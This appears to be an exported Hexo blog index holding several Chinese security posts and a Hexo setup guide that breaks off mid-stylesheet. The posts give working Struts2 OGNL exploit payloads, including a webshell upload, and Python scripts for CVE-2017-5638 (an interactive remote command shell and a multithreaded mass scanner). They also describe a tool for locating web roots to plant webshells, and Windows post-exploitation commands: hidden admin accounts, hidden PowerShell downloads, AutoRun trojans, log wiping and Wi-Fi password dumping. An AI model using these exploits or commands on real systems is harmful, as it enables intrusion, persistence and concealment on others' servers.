更多例子请参考：examples 传送门 【phantomjs系列】phantomjs正确打开方式【phantomjs系列】phantomjs api介绍【phantomjs系列】selenium+phantomjs爬过的那些坑【phantomjs系列】selenium+phantomjs性能优化]]></content>
      <categories>
        <category>爬虫技术</category>
      </categories>
      <tags>
        <tag>Phantomjs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Struts2漏洞POC汇总]]></title>
    <url>../../../../../../../../2017/03/13/Struts2漏洞POC汇总/</url>
    <content type="text"><![CDATA[世界上一成不变的东西，只有“任何事物都是在不断变化的”这条真理。 —— 斯里兰卡免责申明：文章中的工具以及POC等仅供个人测试研究，请在下载后24小时内删除，不得用于商业或非法用途，否则后果自负，如有使用于黑产者，与本文无关 Struts2框架漏洞不断，鉴于struts2使用之广泛，本文汇总Struts2系列漏洞的Poc，给网络管理员或者站长提供查询便利，以便更好的检测自身网站存在的漏洞，也可以让安全从业者更好的了解此漏洞。 struts2-046（2017.3）123456789101112POST /doUpload.action HTTP/1.1Host: localhost:8080Content-Length: 10000000Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAnmUgTEhFhOZpr9zConnection: close ------WebKitFormBoundaryAnmUgTEhFhOZpr9zContent-Disposition: form-data; name="upload"; filename="%&#123;#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test','Kaboom')&#125;"Content-Type: text/plainKaboom ------WebKitFormBoundaryAnmUgTEhFhOZpr9z-- struts2-045（2017.3）(Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10)123456789101112131415161718192021import urllib2import sysfrom poster.encode import multipart_encodefrom poster.streaminghttp import register_openersdef poc(url): register_openers() datagen, header = multipart_encode(&#123;"image1": open("tmp.txt", "rb")&#125;) header["User-Agent"]="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36" header["Content-Type"]="%&#123;(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo nMask').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;" request = urllib2.Request(url,datagen,headers=header) response = urllib2.urlopen(request) body=response.read() return bodyurl="http://job.10086.cn/company/anouncement/showAnouncement.action"url=sys.argv[1]body=poc(url)if "nMask" in body: print "[Loopholes exist]",url struts2_037123http://127.0.0.1:8080/struts2-rest-showcase/orders/3/(%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS)%3f@java.lang.Runtime@getRuntime().exec(%23parameters.cmd):index.xhtml?cmd=calchttp://127.0.0.1:8080/struts2-rest- showcase/orders/3/(%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS)%3F((%23writ%3D(%23attr%5B%23parameters.com%5B0%5D%5D).getWriter())%2C%23writ.println(3345*2356))%3Aindex.xhtml?com=com.opensymphony.xwork2.dispatcher.HttpServletResponse struts2_0321?method:%23_memberAccess%3d%40ognl.OgnlContext%20%40DEFAULT_MEMBER_ACCESS%2c%23a%3d%40java.lang.Runtime%40getRuntime%28%29.exec%28%23parameters.command%20%5B0%5D%29.getInputStream%28%29%2c%23b%3dnew%20java.io.InputStreamReader%28%23a%29%2c%23c%3dnew%20%20java.io.BufferedReader%28%23b%29%2c%23d%3dnew%20char%5B51020%5D%2c%23c.read%28%23d%29%2c%23kxlzx%3d%20%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2c%23kxlzx.println%28%23d%20%29%2c%23kxlzx.close&amp;command=whoami 获取磁盘目录：1method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23path%3d%23req.getRealPath(%23parameters.pp[0]),%23w%3d%23res.getWriter(),%23w.print(%23path),1?%23xx:%23request.toString&amp;pp=%2f&amp;encoding=UTF-8 执行命令:1method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;cmd=whoami&amp;pp=\\A&amp;ppp=%20&amp;encoding=UTF-8 1method:%23_memberAccess[%23parameters.name1[0]]%3dtrue,%23_memberAccess[%23parameters.name[0]]%3dtrue,%23_memberAccess[%23parameters.name2[0]]%3d&#123;&#125;,%23_memberAccess[%23parameters.name3[0]]%3d&#123;&#125;,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew%20java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;name=allowStaticMethodAccess&amp;name1=allowPrivateAccess&amp;name2=excludedPackageNamePatterns&amp;name3=excludedClasses&amp;cmd=whoami&amp;pp=\\A&amp;ppp=%20&amp;encoding=UTF-8 上传文件：1method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23path%3d%23req.getRealPath(%23parameters.pp[0]),new%20java.io.BufferedWriter(new%20java.io.FileWriter(%23path%2b%23parameters.shellname[0]).append(%23parameters.shellContent[0])).close(),%23w.print(%23path),%23w.close(),1?%23xx:%23request.toString&amp;shellname=stest.jsp&amp;shellContent=tttt&amp;encoding=UTF-8&amp;pp=%2f struts2_0161redirect:$&#123;%23res%3d%23context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),%23res.setCharacterEncoding(%22UTF-8%22),%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]&#123;%22whoami%22&#125;)).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[20000],%23d.read(%23e),%23res.getWriter().println(%23e),%23res.getWriter().flush(),%23res.getWriter().close()&#125; struts2_0191debug=command&amp;expression=%23res%3d%23context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),%23res.setCharacterEncoding(%22UTF-8%22),%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]&#123;%22whoami%22&#125;)).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[20000],%23d.read(%23e),%23res.getWriter().println(%23e),%23res.getWriter().flush(),%23res.getWriter().close() 本文POC均来自网络收集，欢迎留言补充]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>struts2漏洞</tag>
        <tag>struts2 Poc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SearchWebPath]]></title>
    <url>../../../../../../../../2017/03/10/SearchWebPath/</url>
    <content type="text"><![CDATA[真的猛士，敢于直面惨淡的人生，敢于正视淋漓的鲜血。—— 鲁迅 近日爆出的struts2-045漏洞可谓掀起了一波新的信息安全危机，基于该漏洞利用较为简单，适用范围广，因此受灾面积可想而知。然而在对某些站点进行安全检测时，难免会遇到一些问题，比如：如何写shell，如何提权等等。这里我针对如何寻找网站物理路径的问题，开发了一个小工具，可自动化的快速定位的网站物理路径，在此分享。 若需Struts2-045 POC或者检测工具，请前往：Struts2-045漏洞 免责申明：本文不在于教唆如何利用struts2漏洞进行网站入侵，只用作技术探讨研究，本文涉及的工具请在下载后24小时内删除，不得用于商业或非法用途，否则后果自负 工具应用场景利用某些特定漏洞，可远程执行命令，希望可以寻找到网站物理路径，写入一句话木马。 前提条件 网站URL是静态的，而不是动态随机生成（即url路径必须与磁盘目录结构一致） 服务器支持上传文件 Function根据网站URL，如：www.xxx.com/a/b/c?id=1，判断出URL所在的网站物理路径地址，如：c:/web/cms/a/b/c。 Usagepython源码文件1python searchweburl.py -p "./" -u "http://www.xxx.com/a/b/c/d?id=1" windows绿色版1searchweburl.exe -p "./" -u "http://www.xxx.com/a/b/c/d?id=1" linux绿色版1./searchweburl -p "./" -u "http://www.xxx.com/a/b/c/d?id=1" Parameter -p –path 待检测的磁盘路径 -u –url 待检测的网站url -h –help 帮助信息 Example针对于windows与linux操作系统，我分别搭建了2套网站，以便测试。 Windows在一台windows服务器上搭建了一个简单的web服务,访问如下： 假设此时我们已经拥有此服务器的shell，但需要在网站路径下写入一句话木马，然而手动寻找网站路径比较费时。将此searchweburl.py上传到服务器任意目录下（没有python环境可上传exe版本），windows下载远程文件命令可参考：windows常用命令。运行如下命令：1searchweburl.exe -p "e:/" -u "http://localhost:8080/m_1_8/user/html/1.html" 运行截图：已经定位出此url所在的物理路径地址。 Linux在一台Linux服务器上搭建了一个简单的web服务,访问如下： 同样的，我们上传searchweburl.py或者seachweburl（linux免环境版），linux下载远程文件命令可参考：Linux常用命令。运行如下命令：1./searchweburl -p "/home" -u "http://172.16.1.2:9990/b/a/b/c/d/1.html" 运行截图： 使用技巧 我们需要注意到的时，再选择url时尽量去挑选目录结构较多的，因为这样定位出来的结果就越准确。继续以上linux的例子，我们选择另外一个url，如：http://172.16.1.2:9990/b/a/1.html。可以看到URL的目录结构少了好几层，那么运行程序看看结果。 出现了2条结果，因为这2条结果都符合url目录结构，一般网站服务器上文件较多，因此选择目录层次较深的网站，可越精准得定位出结果。 鸡肋问题 在我开发这个工具之前，曾用了5分钟的时间思考过此工具的应用场景是否广泛，以及其本身是否鸡肋。无论如何，我最终还是将其开发完成，因为我知道会有人需要它，即使它很鸡肋。 SearchWebPath下载windows免环境版：Searchweburl.exelinux免环境版：Searchweburl Github项目地址：https://github.com/tengzhangchao/SearchWebPath]]></content>
      <categories>
        <category>安全工具</category>
      </categories>
      <tags>
        <tag>Web路径问题</tag>
        <tag>searchwebpath</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows常用命令]]></title>
    <url>../../../../../../../../2017/03/08/Windows常用命令/</url>
    <content type="text"><![CDATA[除苦练内功之外，别无他法。 分享一些自己常用的windows命令，本文会持续更新，全当笔记备份。本文大部分内容来自互联网整理汇总，小部分来自个人经验所总结。 CMD常用命令隐藏木马：1CreateObject("WScript.Shell").RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Command Processor\AutoRun", "calc.exe","REG_SZ" 注册表添加这个值后，当运行cmd时，先运行你的计算器，命令行下cmd /k参数的原理。 列出ie代理设置：1reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings" 下载远程文件：1powershell -w hidden -c (new-object System.Net.WebClient).Downloadfile('http://www.xxx.com/lcx.1','d:\\3.txt') 1bitsadmin /rawreturn /transfer getfile http://127.0.0.1:8080/test.zip F:\123.zip 添加隐藏账号：12net user test$ test /add 添加test用户密码为test的隐藏账号net localgroup administrators test$ /add 把test添加到系统用户组 列出更新的补丁：12wmic qfe list full /format:htable &gt; hotfixes.htmwmic qfe get description,installedOn 在d盘根目录递归查找login.html文件：1cd /d d: &amp;&amp; dir login.html /a-d/b/s 进入某盘符的某个目录下：1d: &amp; cd d:/Clover 重新打开一个cmd运行：1cmd /c whoami 添加计划任务：123schtasks.exe /Create /RU "SYSTEM" /SC MINUTE /MO 45 /TN FIREWALL /TR "c:/1.ex e" /ED 2016/12/12可以把RU里面的system改为自己的账户名称，这样就可以执行添加计划任务了 进程相关：123tasklist 查看进程taskkill /im 进程名称taskkill /pid[进程码] -t(结束该进程) -f(强制结束该进程以及所有子进程) 查看windows系统未打的漏洞补丁：1set KB2829361=MS13-046&amp;set KB2830290=MS13-046&amp;set KB2667440=MS12-020&amp;set KB2667402=MS12-020&amp;set KB3124280=MS16-016&amp;set KB3077657=MS15-077&amp;set KB3045171=MS15-051&amp;set KB2592799=MS11-080&amp;set KB952004=MS09-012 PR&amp;set KB956572=MS09-012 巴西烤肉&amp;set KB970483=MS09-020 iis6&amp;set KB2124261=MS10-065 ii7&amp;set KB2271195=MS10-065 ii7&amp;systeminfo&gt;a.txt&amp;(for %i in (KB952004 KB956572 KB2393802 KB2503665 KB2592799 KB2621440 KB2160329 KB970483 KB2124261 KB977165 KB958644 KB2667402 KB2667440 KB2830290 KB2829361 KB3045171 KB3077657 KB3124280) do @type a.txt|@find /i "%i"||@echo %%i% Not Installed!)&amp;del /f /q /a a.txt 获取保存在注册表中密码的键值：1REG query HKCU /v "pwd" /s #pwd可替换为password \ HKCU 可替换为HKCR 识别开机启动的程序:1wmic startup list full 识别网卡中的IP与Mac：1wmic nicconfig get ipaddress,macaddress 查看共享服务：12wmic share get name,pathnet share 查看系统中日志的位置：1wmic nteventlog get path,filename,writeable 删除日志：123wevtutil cl "windows powershell"wevtutil cl "security"wevtutil cl "system" 运行的服务：12sc query type= servicenet start 安装的软件以及版本：1wmic product get name,version 查看某个进程的详细情况：1wmic process where name="chrome.exe" list full 显示系统中曾连接过的无线密码：(以管理员身份运行)12netsh wlan show profilesnetsh wlan show profiles name="profiles的名字" key=clear 一键获取：1for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear 查看是否为虚拟机：1wmic bios list full | find /i "vmware" 是否支持powershell:1if defined PSModulePath (echo 支持powershell) else (echo 不支持powershell) 电脑产品编号与型号信息：1wmic baseboard get Product,SerialNumber CMD局域网命令arp -a 列出本网段内所有活跃的IP地址arp -a 加对方IP是查对方的MAC地址arp -s （ip + mac）绑定mac与ip地址arp -d （ip + mac）解绑mac与ip地址 net view ——&gt; 查询同一域内机器列表net view /domain ——&gt; 查询域列表net view /domain:domainname —–&gt; 查看workgroup域中计算机列表 ipconfig /all ——&gt; 查询本机IP段，所在域等ipconfig /releaseipconfig /renew 重新获取Ip地址 telnet ip 端口号：尝试能否打开链接远程主机端口 nbtstat -a 加对方IP查对方的主机名tracert 主机名 得到IP地址 netstat -a -nnetstat -an | find “3389”netstat -a查看开启哪些端口netstat -n查看端口的网络连接情况netstat -v查看正在进行的工作netstat -p tcp/ip查看某协议使用情况netstat -s 查看正在使用的所有协议使用情况 nbtstat -n 获取NetBIOSnslookup 域名 查询域名对应的ip DO常用快捷键mspaint 画图工具calc 计算机notepad 记事本taskmgr 任务管理器osk 打开屏幕键盘gpedit.msc 组策略services.msc 本地服务compmgmt.msc 计算机管理devmgmt.msc 设备管理器winver 查看系统版本magnify 放大镜实用程序eventvwr 事件查看器Regedit 打开注册表resmon 资源监视器WMIC BIOS get releasedate 查看电脑生产日期mstsc -f 远程连接（可以全屏） 本文将持续收集更新，欢迎大家留言补充！]]></content>
      <categories>
        <category>技术研究</category>
      </categories>
      <tags>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux常用命令]]></title>
    <url>../../../../../../../../2017/03/08/Linux常用命令/</url>
    <content type="text"><![CDATA[Nothing great was ever achieved without enthusiasm无热情成就不了伟业 本篇内容已经移植到：【玩转Linux系列】Linux基础命令]]></content>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Struts2_045漏洞]]></title>
    <url>../../../../../../../../2017/03/07/Struts2-045漏洞/</url>
    <content type="text"><![CDATA[Struts2是个好东西免责申明：文章中的工具等仅供个人测试研究，请在下载后24小时内删除，不得用于商业或非法用途，否则后果自负 Apache Struts 2被曝存在远程命令执行漏洞，漏洞编号S2-045，CVE编号CVE-2017-5638，在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵，漏洞评级为：高危。漏洞详情：恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞进而执行系统命令。风险等级：高风险。漏洞风险：黑客通过利用漏洞可以实现远程命令执行。影响版本：Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10。安全版本：Struts 2.3.32或2.5.10.1。修复建议：如您正在使用Jakarta文件上传插件，请升级Struts至安全版本。 更多参考：https://cwiki.apache.org/confluence/display/WW/S2-045 POC123456789101112131415161718192021#! -*- encoding:utf-8 -*-import urllib2import sysfrom poster.encode import multipart_encodefrom poster.streaminghttp import register_openersdef poc(url): register_openers() datagen, header = multipart_encode(&#123;"image1": open("tmp.txt", "rb")&#125;) header["User-Agent"]="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36" header["Content-Type"]="%&#123;(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo nMask').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;" request = urllib2.Request(url,datagen,headers=header) response = urllib2.urlopen(request) body=response.read() return bodyurl=sys.argv[1]body=poc(url)if "nMask" in body: print "[Loopholes exist]",url Poc_Cmd123456789101112131415161718192021222324import urllib2import sysfrom poster.encode import multipart_encodefrom poster.streaminghttp import register_openersdef poc(url,content="echo nMask"): register_openers() datagen, header = multipart_encode(&#123;"image1": open("tmp.txt", "rb")&#125;) header["User-Agent"]="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36" header["Content-Type"]="%&#123;(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"+content+"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;" request = urllib2.Request(url,datagen,headers=header) response = urllib2.urlopen(request) body=response.read() return bodyurl=sys.argv[1]body=poc(url)if "nMask" in body: print "[Loopholes exist]",url while 1: con=raw_input("[cmd]&gt;&gt;") print poc(url,content=con) 运行结果：1234567&gt;python s2_045_cmd.py http://xxx.com/?a.action[Loopholes exist] http://xxx.com/?a.action[cmd]&gt;&gt;lsexample1example2 多线程批量检测1234567891011121314151617181920212223242526272829303132333435import urllib2from poster.encode import multipart_encodefrom poster.streaminghttp import register_openersimport threadingdef poc(url): register_openers() datagen, header = multipart_encode(&#123;"image1": open("tmp.txt", "rb")&#125;) header["User-Agent"]="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36" header["Content-Type"]="%&#123;(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo nMask').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;" try: request = urllib2.Request(url,datagen,headers=header) response = urllib2.urlopen(request,timeout=5) body=response.read() except: body="" if "nMask" in body: print "[Loopholes exist]",url f.write(url+"\n") else: print "Loopholes not exist",urlif __name__=="__main__": ''' url.txt为待检测url列表 result.txt为检测完输出结果文件 ''' f=open("result.txt","a") url_list=[i.replace("\n","") for i in open("url.txt","r").readlines()] for url in url_list: threading.Thread(target=poc,args=(url,)).start() while 1: if(len(threading.enumerate())&lt;50): break POC下载地址：https://github.com/tengzhangchao/Struts2_045-Poc 传送门struts2-052漏洞struts2-046漏洞struts2_045漏洞struts2漏洞poc汇总]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>struts2漏洞</tag>
        <tag>struts2 Poc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo搭建博客教程]]></title>
    <url>../../../../../../../../2017/03/03/Hexo搭建博客教程/</url>
    <content type="text"><![CDATA[所谓博客，都是孤芳自赏现在越来越多的人喜欢利用Github搭建静态网站，原因不外乎简单省钱。本人也利用hexo+github搭建了本博客，用于分享一些心得。在此过程中，折腾博客的各种配置以及功能占具了我一部分时间，在此详细记录下我是如何利用hexo+github搭建静态博客以及一些配置相关问题，以免过后遗忘，且当备份之用。 准备工作 下载node.js并安装（官网下载安装），默认会安装npm。 下载安装git（官网下载安装） 下载安装hexo。方法：打开cmd 运行npm install -g hexo（要翻墙） 本地搭建hexo静态博客 新建一个文件夹，如MyBlog 进入该文件夹内，右击运行git，输入：hexo init（生成hexo模板，可能要翻墙） 生成完模板，运行npm install（目前貌似不用运行这一步） 最后运行：hexo server （运行程序，访问本地localhost:4000可以看到博客已经搭建成功） 将博客与Github关联 在Github上创建名字为XXX.github.io的项目，XXX为自己的github用户名。 打开本地的MyBlog文件夹项目内的_config.yml配置文件，将其中的type设置为git 1234deploy: type: git repository: https://github.com/tengzhangchao/tengzhangchao.github.io.git branch: master 运行：npm install hexo-deployer-git –save 运行：hexo g（本地生成静态文件） 运行：hexo d（将本地静态文件推送至Github） 此时，打开浏览器，访问http://tengzhangchao.github.io 绑定域名 博客已经搭建好，也能通过github的域名访问，但总归还是用自己的域名比较舒服。因为我们需要设置将自己的域名绑定到github这个博客项目上。 域名提供商设置 添加2条A记录： @—&gt;192.30.252.154 @—&gt;192.30.252.153 添加一条CNAME记录： CNAME—&gt;tengzhangchao.github.io 博客添加CNAME文件 配置完域名解析后，进入博客目录，在source目录下新建CNAME文件，写入域名，如：thief.one 运行：hexo g 运行：hexo d 更新博客内容 至此博客已经搭建完毕，域名也已经正常解析，那么剩下的问题就是更新内容了。 更新文章 在MyBlog目录下执行：hexo new “我的第一篇文章”，会在source-&gt;_posts文件夹内生成一个.md文件。 编辑该文件（遵循Markdown规则） 修改起始字段 title 文章的标题 date 创建日期 （文件的创建日期 ） updated 修改日期 （ 文件的修改日期） comments 是否开启评论 true tags 标签 categories 分类 permalink url中的名字（文件名） 编写正文内容（MakeDown） hexo clean 删除本地静态文件（Public目录），可不执行。 hexo g 生成本地静态文件（Public目录） hexo deploy 将本地静态文件推送至github（hexo d） 添加菜单进入theme目录，编辑_config_yml文件，找到menu:字段，在该字段下添加一个字段。 1234menu: home: / about: /about ...... 然后找到lanhuages目录，编辑zh-Hans.yml文件： 1234menu: home: 首页 about: 关于作者 ...... 更新页面显示的中文字符，最后进入theme目录下的Source目录，新增一个about目录，里面写一个index.html文件。 文章内插入图片在文章中写入: 1![](/upload_image/1.jpg) 然后进入themes-主题名-source-upload_image目录下(自己创建)，将图片放到这个目录下，就可以了。 说明：当执行hexo g命令时，会自动把图片复制到 public文件的upload_image目录下。 个性化设置基本信息 在根目录下的_config.yml文件中，可以修改标题，作者等信息。打开编辑该文件，注意：每一个值的冒号后面都有一个半角空格！ 未生效的写法：title:nMask的博客 能生效的写法：title:[空格]nMask的博客 主题访问主题列表，获取主题代码。 进入themes目录，进入以下操作： 下载主题 (以next主题为例) 1git clone https://github.com/iissnan/hexo-theme-next.git（主题的地址） 打开__config.yml文件，将themes修改为next（下载到的主题文件夹的名字） hexo g hexo d 关于hexo-next主题下的一些个性化配置，参考：Next主题配置 主题美化文章中添加居中模块文章Markdown中填写如下：1&lt;blockquote class=&quot;blockquote-center&quot;&gt;优秀的人，不是不合群，而是他们合群的人里面没有你&lt;/blockquote&gt; 在文章底部增加版权信息在目录 next/layout/_macro/下添加 my-copyright.swig：1234567891011121314151617181920212223242526272829303132&#123;% if page.copyright %&#125;&lt;div class="my_post_copyright"&gt; &lt;script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"&gt;&lt;/script&gt; &lt;!-- JS库 sweetalert 可修改路径 --&gt; &lt;script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"&gt;&lt;/script&gt; &lt;script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"&gt;&lt;/script&gt; &lt;link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css"&gt; &lt;p&gt;&lt;span&gt;本文标题:&lt;/span&gt;&lt;a href="&#123;&#123; url_for(page.path) &#125;&#125;"&gt;&#123;&#123; page.title &#125;&#125;&lt;/a&gt;&lt;/p&gt; &lt;p&gt;&lt;span&gt;文章作者:&lt;/span&gt;&lt;a href="/" title="访问 &#123;&#123; theme.author &#125;&#125; 的个人博客"&gt;&#123;&#123; theme.author &#125;&#125;&lt;/a&gt;&lt;/p&gt; &lt;p&gt;&lt;span&gt;发布时间:&lt;/span&gt;&#123;&#123; page.date.format("YYYY年MM月DD日 - HH:MM") &#125;&#125;&lt;/p&gt; &lt;p&gt;&lt;span&gt;最后更新:&lt;/span&gt;&#123;&#123; page.updated.format("YYYY年MM月DD日 - HH:MM") &#125;&#125;&lt;/p&gt; &lt;p&gt;&lt;span&gt;原始链接:&lt;/span&gt;&lt;a href="&#123;&#123; url_for(page.path) &#125;&#125;" title="&#123;&#123; page.title &#125;&#125;"&gt;&#123;&#123; page.permalink &#125;&#125;&lt;/a&gt; &lt;span class="copy-path" title="点击复制文章链接"&gt;&lt;i class="fa fa-clipboard" data-clipboard-text="&#123;&#123; page.permalink &#125;&#125;" aria-label="复制成功！"&gt;&lt;/i&gt;&lt;/span&gt; &lt;/p&gt; &lt;p&gt;&lt;span&gt;许可协议:&lt;/span&gt;&lt;i class="fa fa-creative-commons"&gt;&lt;/i&gt; &lt;a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)"&gt;署名-非商业性使用-禁止演绎 4.0 国际&lt;/a&gt; 转载请保留原文链接及作者。&lt;/p&gt; &lt;/div&gt;&lt;script&gt; var clipboard = new Clipboard('.fa-clipboard'); clipboard.on('success', $(function()&#123; $(".fa-clipboard").click(function()&#123; swal(&#123; title: "", text: '复制成功', html: false, timer: 500, showConfirmButton: false &#125;); &#125;); &#125;)); &lt;/script&gt;&#123;% endif %&#125; 在目录next/source/css/_common/components/post/下添加my-post-copyright.styl：123456789101112131415161718192021222324252627282930313233343536373839404142434445.my_post_copyright &#123; width: 85%; max-width: 45em; margin: 2.8em auto 0; padding: 0.5em 1.0em; border: 1px solid #d3d3d3; font-size: 0.93rem; line-height: 1.6em; word-break: break-all; background: rgba(255,255,255,0.4);&#125;.my_post_copyright p&#123;margin:0;&#125;.my_post_copyright span &#123; display: inline-block; width: 5.2em; color: #b5b5b5; font-weight: bold;&#125;.my_post_copyright .raw &#123; margin-left: 1em; width: 5em;&#125;.my_post_copyright a &#123; color: #808080; border-bottom:0;&#125;.my_post_copyright a:hover 